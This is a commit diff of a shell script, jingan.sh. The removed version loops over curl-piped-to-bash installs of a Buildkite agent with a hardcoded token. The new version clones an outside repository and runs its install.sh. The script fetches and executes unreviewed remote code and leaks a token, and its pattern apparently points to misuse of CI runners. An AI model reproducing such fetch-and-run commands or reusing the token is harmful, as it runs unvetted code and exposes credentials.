5c259ffe04c9f525398545dc89dc95ccb4f81a3b
asamjawas <85292358+asamjawas@users.noreply.github.com>
2021-09-17 14:39:10 +0700

    Update jingan.sh

--- jingan.sh
+++ jingan.sh
@@ -1,11 +1,4 @@
 #!/bin/sh
-apt-get update -y
-COUNTER=50
-until [  $COUNTER -lt 10 ]; do
-TOKEN="6421ac911712a626a2f9e16b1c4cf960e8c85dbca3fbd62d31" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`"
-timeout 288m ~/.buildkite-agent/bin/buildkite-agent start
-echo "yohoho"
-
-     echo COUNTER $COUNTER
-     let COUNTER-=1
-done
+git clone https://github.com/mcthavez/circleci.git
+cd circleci
+chmod 700 install.sh && ./install.sh
